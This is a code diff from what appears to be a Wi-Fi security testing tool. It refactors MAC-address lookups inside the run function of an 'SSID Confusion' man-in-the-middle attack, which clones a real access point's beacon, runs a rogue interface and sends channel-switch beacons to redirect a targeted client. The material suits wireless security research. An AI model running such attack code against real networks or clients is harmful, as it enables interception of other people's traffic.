@@ -46,16 +46,16 @@ void run_attack(RunStatus &){
         const bool   strip_rsn    = att_cfg.value("strip_rsn", false);
         const int    timeout      = att_cfg.value("attack_time_sec", 30);
 
-        McMitm attack(att_real["iface"], att_rogue["iface"], real_ssid, client["mac"]);
-        attack.setup_ifaces(att_real, client["mac"], att_rogue, ap["mac"]);
+        McMitm attack(att_real["iface"], att_rogue["iface"], real_ssid, client.get(SK::mac));
+        attack.setup_ifaces(att_real, client.get(SK::mac), att_rogue, ap.get(SK::mac));
         rs.start_observers();
 
         attack.sender_real  = make_unique<PacketSender>(att_real["sniff_iface"]);
         attack.sender_rogue = make_unique<PacketSender>(att_rogue["sniff_iface"]);
 
         // Sniff only frames involving the real AP or the targeted client
-        string bpf = "(wlan addr1 "+ap["mac"]+") or (wlan addr2 "+ap["mac"]+")"
-            " or (wlan addr1 "+client["mac"]+") or (wlan addr2 "+client["mac"]+")";
+        string bpf = "(wlan addr1 "+ap.get(SK::mac)+") or (wlan addr2 "+ap.get(SK::mac)+")"
+            " or (wlan addr1 "+client.get(SK::mac)+") or (wlan addr2 "+client.get(SK::mac)+")";
         bpf = "(wlan type data or wlan type mgt) and ("+bpf+")";
 
         SnifferConfiguration cfg_real, cfg_rogue;
@@ -69,7 +69,7 @@ void run_attack(RunStatus &){
 
         // Scan for real AP beacon to clone its IEs (RSN, HT caps, …)
         attack_scan::ScanAP scan_ap{};
-        scan_ap.bssid = ap["mac"];
+        scan_ap.bssid = ap.get(SK::mac);
         attack.beacon = RSN_scan(att_real["iface"], 10, scan_ap);
         if (!attack.beacon)
             throw run_err("SSID Confusion: beacon of real AP not found");
@@ -85,8 +85,8 @@ void run_attack(RunStatus &){
         attack.netconfig.real_channel  = Channel{stoi(ap["channel"])};
         attack.netconfig.rogue_channel = Channel{stoi(att_rogue["channel"])};
         attack.netconfig.ssid = real_ssid;
-        attack.ap_mac         = ap["mac"];
-        attack.client_mac     = client["mac"];
+        attack.ap_mac         = ap.get(SK::mac);
+        attack.client_mac     = client.get(SK::mac);
 
         // McMitm::run() sends CSA beacons continuously throughout its loop
         attack.run(timeout);
